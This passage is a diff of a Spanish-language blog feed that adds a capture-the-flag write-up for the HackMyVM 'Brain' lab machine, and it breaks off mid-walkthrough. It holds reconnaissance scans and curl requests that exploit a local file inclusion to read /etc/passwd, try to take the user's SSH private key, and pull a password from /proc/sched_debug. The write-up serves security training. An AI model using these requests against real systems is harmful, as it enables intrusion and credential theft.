@@ -1,4 +1,447 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.9.0">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2022-01-01T14:06:18+01:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">RiJaba1’s Page</title><subtitle>Cybersecurity Junior | HTB &amp; HMVM Player | Red Team Pentester</subtitle><author><name>RiJaba1</name></author><entry><title type="html">Herramienta portDiscoverSH</title><link href="http://localhost:4000/herramienta-portDiscoverSH/" rel="alternate" type="text/html" title="Herramienta portDiscoverSH" /><published>2021-12-19T00:00:00+01:00</published><updated>2021-12-19T00:00:00+01:00</updated><id>http://localhost:4000/herramienta-portDiscoverSH</id><content type="html" xml:base="http://localhost:4000/herramienta-portDiscoverSH/">&lt;h2 id=&quot;utilidad&quot;&gt;Utilidad&lt;/h2&gt;
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.9.0">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2022-01-02T16:48:02+01:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">RiJaba1’s Page</title><subtitle>Cybersecurity Junior | HTB &amp; HMVM Player | Red Team Pentester</subtitle><author><name>RiJaba1</name></author><entry><title type="html">HackMyVm Brain Writeup</title><link href="http://localhost:4000/brain-hackmyvm-writeup/" rel="alternate" type="text/html" title="HackMyVm Brain Writeup" /><published>2022-01-02T00:00:00+01:00</published><updated>2022-01-02T00:00:00+01:00</updated><id>http://localhost:4000/brain-hackmyvm-writeup</id><content type="html" xml:base="http://localhost:4000/brain-hackmyvm-writeup/">&lt;h1 id=&quot;brain-writeup&quot;&gt;Brain Writeup&lt;/h1&gt;
+
+&lt;p&gt;En este post os enseñaré a como vulnerar la máquina Brain de la platadorma HackMyVM. La máquina está categorizada como Easy.&lt;/p&gt;
+
+&lt;h2 id=&quot;reconocimiento&quot;&gt;Reconocimiento&lt;/h2&gt;
+
+&lt;h3 id=&quot;reconocimiento-de-la-ip&quot;&gt;Reconocimiento de la IP&lt;/h3&gt;
+
+&lt;p&gt;La máquina ya te da la pista de cual es su IP, pero no obstante os enseñaré a como identificarla:&lt;/p&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;┌─[root@rijaba1-pc]─[~/Desktop/Brain]
+└──╼ &lt;span class=&quot;c&quot;&gt;#fping -a -g 192.163.0.0/24 2&amp;gt;/dev/null&lt;/span&gt;
+192.163.0.1 
+192.163.0.2 
+192.163.0.3 
+192.163.0.8  &lt;span class=&quot;c&quot;&gt;# Mi IP&lt;/span&gt;
+192.163.0.53 &lt;span class=&quot;c&quot;&gt;# IP de la máquina&lt;/span&gt;
+
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;En mi caso hay mas IP debido a que las máquinas virtuales están conectadas a una red NAT creada por VirtualBox.&lt;/p&gt;
+
+&lt;h3 id=&quot;nmap&quot;&gt;NMAP&lt;/h3&gt;
+
+&lt;p&gt;Para descubrir los puertos abiertos de la máquina usamos NMAP pero también podemos usar otras herramientas como &lt;a href=&quot;http://127.0.0.1:4000/herramienta-portDiscoverSH/&quot;&gt;portDiscoverSH&lt;/a&gt;&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;┌─[root@rijaba1-pc]─[~/Desktop/Brain/nmap]
+└──╼ &lt;span class=&quot;c&quot;&gt;#nmap -p- --open -T5 -v -n 192.163.0.53&lt;/span&gt;
+
+Starting Nmap 7.92 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt; https://nmap.org &lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; at 2022-01-02 15:35 CET
+Initiating ARP Ping Scan at 15:35
+Scanning 192.163.0.53 &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;1 port]
+Completed ARP Ping Scan at 15:35, 0.03s elapsed &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;1 total hosts&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+Initiating SYN Stealth Scan at 15:35
+Scanning 192.163.0.53 &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;65535 ports]
+Discovered open port 80/tcp on 192.163.0.53
+Discovered open port 22/tcp on 192.163.0.53
+Completed SYN Stealth Scan at 15:35, 4.73s elapsed &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;65535 total ports&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+Nmap scan report &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;192.163.0.53
+Host is up &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0.00013s latency&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
+Not shown: 65533 closed tcp ports &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;reset&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+PORT   STATE SERVICE
+22/tcp open  ssh
+80/tcp open  http
+MAC Address: 08:00:27:1A:B4:8C &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Oracle VirtualBox virtual NIC&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+
+Read data files from: /usr/bin/../share/nmap
+Nmap &lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;: 1 IP address &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;1 host up&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; scanned &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;4.89 seconds
+	Raw packets sent: 65543 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;2.884MB&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; | Rcvd: 65543 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;2.622MB&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Este comando sirve para descubrir los puertos &lt;strong&gt;abiertos&lt;/strong&gt; de la máquina, el parámetro -T5 es la plantilla de tempoizado, que comprende desde el 1 al 5, yo recomiendo usar -T4 debido a que el -T5 puede llegar a saltarse algún puerto abierto (yo uso el -T5 por qué ya había hecho el escaneo antes).&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;┌─[root@rijaba1-pc]─[~/Desktop/Brain/nmap]
+└──╼ &lt;span class=&quot;c&quot;&gt;#nmap -sCV -p22,80 192.163.0.53&lt;/span&gt;
+Starting Nmap 7.92 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt; https://nmap.org &lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; at 2022-01-02 15:39 CET
+Nmap scan report &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;192.163.0.53
+Host is up &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0.00028s latency&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
+
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;protocol 2.0&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+| ssh-hostkey: 
+|   2048 32:95:f9:20:44:d7:a1:d1:80:a8:d6:95:91:d5:1e:da &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;RSA&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+|   256 07:e7:24:38:1d:64:f6:88:9a:71:23:79:b8:d8:e6:57 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;ECDSA&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+|_  256 58:a6:da:1e:0f:89:42:2b:ba:de:00:fc:71:78:3d:56 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;ED25519&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+80/tcp open  http    Apache httpd 2.4.38 &lt;span class=&quot;o&quot;&gt;((&lt;/span&gt;Debian&lt;span class=&quot;o&quot;&gt;))&lt;/span&gt;
+|_http-title: Apache2 Debian Default Page: It works
+|_http-server-header: Apache/2.4.38 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Debian&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+MAC Address: 08:00:27:1A:B4:8C &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Oracle VirtualBox virtual NIC&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+Service Info: OS: Linux&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
+Nmap &lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;: 1 IP address &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;1 host up&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; scanned &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;7.20 seconds
+
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;Este comando de nmap nos permite averiguar las versiones y servicios que están ejecutandose en los puertos 22 y 80, el parámetro -sCV es una fusión del parámetro -sC y -sV.&lt;/p&gt;
+
+&lt;h3 id=&quot;fuzzing&quot;&gt;Fuzzing&lt;/h3&gt;
+
+&lt;p&gt;Cuando entramos en internet y teclamos http://IP:80/ nos sale lo siguiente:&lt;/p&gt;
+
+&lt;p&gt;Para descubrir posibles rutas usaremos gobuster, también se pueden usar herramientas como wfuzz que emplearemos más adelante&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;┌─[root@rijaba1-pc]─[~/Desktop/Brain]
+└──╼ &lt;span class=&quot;c&quot;&gt;#gobuster dir -u 'http://192.163.0.53/' -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x html,php,txt&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;===============================================================&lt;/span&gt;
+Gobuster v3.1.0
+by OJ Reeves &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;@TheColonial&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &amp;amp; Christian Mehlmauer &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;@firefart&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;===============================================================&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Url:                     http://192.163.0.53/
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Method:                  GET
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Threads:                 10
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Negative Status codes:   404
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] User Agent:              gobuster/3.1.0
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Extensions:              html,php,txt
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Timeout:                 10s
+&lt;span class=&quot;o&quot;&gt;===============================================================&lt;/span&gt;
+2022/01/02 15:44:51 Starting gobuster &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;directory enumeration mode
+&lt;span class=&quot;o&quot;&gt;===============================================================&lt;/span&gt;
+/index.html           &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Status: 200&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Size: 10701]
+/robots.txt           &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Status: 200&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Size: 162]  
+/brainstorm           &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Status: 301&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Size: 317] &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; http://192.163.0.53/brainstorm/]
+/server-status        &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Status: 403&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Size: 277]                                      
+                                                                                     
+&lt;span class=&quot;o&quot;&gt;===============================================================&lt;/span&gt;
+2022/01/02 15:46:32 Finished
+&lt;span class=&quot;o&quot;&gt;===============================================================&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;Con este comando buscamos todas las direcciones con formato .html, .php y .txt. Aquí lo que más llama la atención es /brainstorm. Vamos a ver lo que se muestra en el navegador cuando entramos:&lt;/p&gt;
+
+&lt;p align=&quot;center&quot;&gt;
+	&lt;img src=&quot;/assets/images/brain-hackmyvm-writeup/IMG1.PNG&quot; /&gt;
+&lt;/p&gt;
+
+&lt;p&gt;Nada interesante…&lt;/p&gt;
+
+&lt;p&gt;Ahora vamos a hacer el mismo fuzzing que antes sobre el directorio /brainstorm&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;┌─[root@rijaba1-pc]─[~/Desktop/Brain]
+└──╼ &lt;span class=&quot;c&quot;&gt;#gobuster dir -u 'http://192.163.0.53/brainstorm/' -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x html,php,txt&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;===============================================================&lt;/span&gt;
+Gobuster v3.1.0
+by OJ Reeves &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;@TheColonial&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &amp;amp; Christian Mehlmauer &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;@firefart&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;===============================================================&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Url:                     http://192.163.0.53/brainstorm/
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Method:                  GET
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Threads:                 10
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Negative Status codes:   404
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] User Agent:              gobuster/3.1.0
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Extensions:              html,php,txt
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Timeout:                 10s
+&lt;span class=&quot;o&quot;&gt;===============================================================&lt;/span&gt;
+2022/01/02 15:49:21 Starting gobuster &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;directory enumeration mode
+&lt;span class=&quot;o&quot;&gt;===============================================================&lt;/span&gt;
+/index.html           &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Status: 200&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Size: 80]
+/file.php             &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Status: 200&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Size: 0] 
+                                              
+&lt;span class=&quot;o&quot;&gt;===============================================================&lt;/span&gt;
+2022/01/02 15:51:02 Finished
+&lt;span class=&quot;o&quot;&gt;===============================================================&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Al entrar en /file.php no encontramos nada podríamos estar delante de una Web Shell o de un LFI (Local File Inclusion), primero vamos a probar a ver si es un LFI, para ello vamos a usar la herramienta wfuzz:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;┌─[root@rijaba1-pc]─[~/Desktop/Brain]
+└──╼ &lt;span class=&quot;c&quot;&gt;#wfuzz -c -t 200 --hh=0 -u 'http://192.163.0.53/brainstorm/file.php?FUZZ=/etc/passwd' -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt&lt;/span&gt;
+
+&lt;span class=&quot;k&quot;&gt;********************************************************&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; Wfuzz 3.1.0 - The Web Fuzzer                         &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;********************************************************&lt;/span&gt;
+
+Target: http://192.163.0.53/brainstorm/file.php?FUZZ&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;/etc/passwd
+Total requests: 220560
+
+&lt;span class=&quot;o&quot;&gt;=====================================================================&lt;/span&gt;
+ID           Response   Lines    Word       Chars       Payload                                                                                                                     
+&lt;span class=&quot;o&quot;&gt;=====================================================================&lt;/span&gt;
+
+000000759:   200        26 L     38 W       1401 Ch     &lt;span class=&quot;s2&quot;&gt;&quot;file&quot;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Rápidamente encontramos file, esto significa que estamos ante un LFI, al entrar al navegador nos encontramos con esto:&lt;/p&gt;
+
+&lt;p align=&quot;center&quot;&gt;
+	&lt;img src=&quot;/assets/images/brain-hackmyvm-writeup/IMG2.PNG&quot; /&gt;
+&lt;/p&gt;
+
+&lt;h2 id=&quot;obtener-acceso&quot;&gt;Obtener Acceso&lt;/h2&gt;
+
+&lt;p&gt;Para que sea más fácil de entender podemos hacer uso de curl:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;┌─[root@rijaba1-pc]─[~/Desktop/Brain]
+└──╼ &lt;span class=&quot;c&quot;&gt;#curl 'http://192.163.0.53/brainstorm/file.php?file=/etc/passwd'&lt;/span&gt;
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+&lt;span class=&quot;nb&quot;&gt;sync&lt;/span&gt;:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats Bug-Reporting System &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;admin&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;:/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
+systemd-timesync:x:101:102:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
+systemd-network:x:102:103:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
+systemd-resolve:x:103:104:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
+messagebus:x:104:110::/nonexistent:/usr/sbin/nologin
+sshd:x:105:65534::/run/sshd:/usr/sbin/nologin
+salomon:x:1000:1000:salomon,,,:/home/salomon:/bin/bash
+systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;Encontamos a un usuario llamado salomon, dado que está el servicio SSH en funcionamiento podemos intentar robarle la clave id_rsa:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;┌─[root@rijaba1-pc]─[~/Desktop/Brain]
+└──╼ &lt;span class=&quot;c&quot;&gt;#curl 'http://192.163.0.53/brainstorm/file.php?file=/home/salomon/.ssh/id_rsa'&lt;/span&gt;
+┌─[root@rijaba1-pc]─[~/Desktop/Brain]
+└──╼ &lt;span class=&quot;c&quot;&gt;#&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;En este caso no podemos hacerlo, ahora lo que podemos intentar es buscar algún &lt;em&gt;log&lt;/em&gt; o archivo que nos pueda dar alguna pista.&lt;/p&gt;
+
+&lt;p&gt;En este punto vamos a comprobar si tenemos permiso de lectura del archivo ‘/proc/sched_debug’, el cual nos daría información sobre los procesos que se están ejecutando en la máquina víctima:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;┌─[✗]─[root@rijaba1-pc]─[~/Desktop/Brain]
+└──╼ &lt;span class=&quot;c&quot;&gt;#curl 'http://192.163.0.53/brainstorm/file.php?file=/proc/sched_debug'&lt;/span&gt;
+
+&lt;span class=&quot;nt&quot;&gt;-----------&lt;/span&gt;
+
+runnable tasks:
+ S           task   PID         tree-key  switches  prio     wait-time             sum-exec        sum-sleep
+&lt;span class=&quot;nt&quot;&gt;-----------------------------------------------------------------------------------------------------------&lt;/span&gt;
+ S        systemd     1     63716.678589      2552   120         0.000000       569.418285         0.000000 0 0 /
+ S       kthreadd     2     63730.424674       138   120         0.000000         1.230426         0.000000 0 0 /
+ I         rcu_gp     3       115.023572         2   100         0.000000         0.001783         0.000000 0 0 /
+ I     rcu_par_gp     4       116.523710         2   100         0.000000         0.000963         0.000000 0 0 /
+ I   kworker/0:0H     6       873.675936         6   100         0.000000         0.020983         0.000000 0 0 /
+ I   kworker/u2:0     7     63680.909027       683   120         0.000000        49.459140         0.000000 0 0 /
+ I   mm_percpu_wq     8       122.093852         2   100         0.000000         0.001041         0.000000 0 0 /
+ S    ksoftirqd/0     9     63734.905091     96268   120         0.000000      2008.140206         0.000000 0 0 /
+ I      rcu_sched    10     63738.789502    201645   120         0.000000      1101.001688         0.000000 0 0 /
+ I         rcu_bh    11       128.095063         2   120         0.000000         0.000611         0.000000 0 0 /
+ S    migration/0    12         0.000000      2052     0         0.000000        44.676092         0.000000 0 0 /
+ S        cpuhp/0    14      1169.032602        11   120         0.000000         0.087116         0.000000 0 0 /
+ S      kdevtmpfs    15      1192.514680       148   120         0.000000         0.370252         0.000000 0 0 /
+ I          netns    16       140.113027         2   100         0.000000         0.001332         0.000000 0 0 /
+ S        kauditd    17      1157.126260         4   120         0.000000         0.023842         0.000000 0 0 /
+ S     khungtaskd    18     63697.348687        69   120         0.000000         1.633504         0.000000 0 0 /
+ S     oom_reaper    19       146.114372         2   120         0.000000         0.000883         0.000000 0 0 /
+ I      writeback    20       148.114399         2   100         0.000000         0.001175         0.000000 0 0 /
+ S     kcompactd0    21       150.115346         2   120         0.000000         0.001261         0.000000 0 0 /
+ S           ksmd    22       152.116626         2   125         0.000000         0.001198         0.000000 0 0 /
+ S     khugepaged    23     63741.749832       817   139         0.000000        71.709128         0.000000 0 0 /
+ I         crypto    24       156.116209         2   100         0.000000         0.001691         0.000000 0 0 /
+ I    kintegrityd    25       158.116328         2   100         0.000000         0.001214         0.000000 0 0 /
+ I        kblockd    26       160.116910         2   100         0.000000         0.001825         0.000000 0 0 /
+ I    edac-poller    27       172.502000         2   100         0.000000         0.001684         0.000000 0 0 /
+ I     devfreq_wq    28       174.002316         2   100         0.000000         0.001356         0.000000 0 0 /
+ S      watchdogd    29         0.000000         2     0         0.000000         0.001319         0.000000 0 0 /
+ S        kswapd0    30     62396.089862       789   120         0.000000       519.895016         0.000000 0 0 /
+ I       kthrotld    48       556.008766         2   100         0.000000         0.002137         0.000000 0 0 /
+ I  ipv6_addrconf    49       557.208873         2   100         0.000000         0.001312         0.000000 0 0 /
+ I          kstrp    59       583.981637         2   100         0.000000         0.001553         0.000000 0 0 /
+ I        ata_sff   103       695.238146         2   100         0.000000         0.002432         0.000000 0 0 /
+ S      scsi_eh_0   105       797.647303         4   120         0.000000        11.211631         0.000000 0 0 /
+
+&lt;span class=&quot;nt&quot;&gt;----------------&lt;/span&gt;
+
+ S    &lt;span class=&quot;k&quot;&gt;in&lt;/span&gt;:imuxsock   333     63658.826278       219   120         0.000000         3.917773         0.000000 0 0 /
+ S      &lt;span class=&quot;k&quot;&gt;in&lt;/span&gt;:imklog   334      8713.100742         5   120         0.000000         0.512810         0.000000 0 0 /
+ S  rs:main Q:Reg   341     63658.829305       275   120         0.000000         4.945284         0.000000 0 0 /
+ S           cron   328      1178.142641        37   120         0.000000         1.320024         0.000000 0 0 /
+ S       dhclient   346     63658.947787       299   120         0.000000        15.911270         0.000000 0 0 /
+ S             sh   350      1181.323932         8   120         0.000000         0.450660         0.000000 0 0 /
+ Ssalomon:XXXXXXX   355      1182.800227        19   120         0.000000         0.992876         0.000000 0 0 /
+ S         python   369     63738.785020     16658   120         0.000000       766.599960         0.000000 0 0 /
+ S          &lt;span class=&quot;nb&quot;&gt;sleep   &lt;/span&gt;370      1185.145485         4   120         0.000000         0.330095         0.000000 0 0 /
+ S         agetty   394     63639.075848        54   120         0.000000         4.815542         0.000000 0 0 /
+ S           sshd   400     47171.787284        79   120         0.000000         9.011313         0.000000 0 0 /
+ S        apache2   447     63738.813279      8278   120         0.000000       426.373394         0.000000 0 0 /
+ S        apache2   933     62402.551365    120465   120         0.000000     11680.783599         0.000000 0 0 /
+ S        apache2   935     62402.570149    121210   120         0.000000     11652.524825         0.000000 0 0 /
+ S           sshd   957     23631.807253        73   120         0.000000        12.466195         0.000000 0 0 /
+ S        systemd   960     24078.702466        80   120         0.000000        12.362455         0.000000 0 0 /
+ S       &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;sd-pam&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;   961     23603.286953         3   120         0.000000         0.079491         0.000000 0 0 /
+ S           sshd   969     43696.981737      2929   120         0.000000        80.065888         0.000000 0 0 /
+ S           bash   970     43652.951614       840   120         0.000000        48.213812         0.000000 0 0 /
+ S             su 11753     43663.369220        18   120         0.000000         5.684415         0.000000 0 0 /
+ S           bash 11754     43697.027139        61   120         0.000000        10.535508         0.000000 0 0 /
+ S        apache2 12160     62402.521737    119215   120         0.000000     11441.040908         0.000000 0 0 /
+ S        apache2 12175     62402.521261     60943   120         0.000000      5855.319223         0.000000 0 0 /
+ S        apache2 12176     63556.634764     59731   120         0.000000      5756.314840         0.000000 0 0 /
+ S        apache2 12178     63666.769308     59574   120         0.000000      5689.522428         0.000000 0 0 /
+ I    kworker/0:0 12182     63738.858168      9678   120         0.000000       268.195123         0.000000 0 0 /
+ S        apache2 12192     62402.547221        57   120         0.000000         9.196506         0.000000 0 0 /
+ S        apache2 12293     63556.742439        14   120         0.000000         2.126920         0.000000 0 0 /
+ S        apache2 12295     63615.246831        14   120         0.000000         1.884778         0.000000 0 0 /
+&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;R        apache2 12296     63738.749832        13   120         0.000000         1.558960         0.000000 0 0 /
+ I    kworker/0:1 12341     63733.416116       161   120         0.000000         6.446626         0.000000 0 0 /
+ I    kworker/0:2 12351     63735.074048        74   120         0.000000         2.886262         0.000000 0 0 /
+ I    kworker/0:3 12352     63736.412425         2   120         0.000000         0.001362         0.000000 0 0 /
+
+
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;He tenido que cortar la salida del comando porque era muy largo… Puede que parecer que no hay nada interesante, pero sí que lo hay, podemos ver que en una parte se menciona al ya conocido usuario salomon, seguido de dos puntos que parece su contraseña (yo le pusé X).&lt;/p&gt;
+
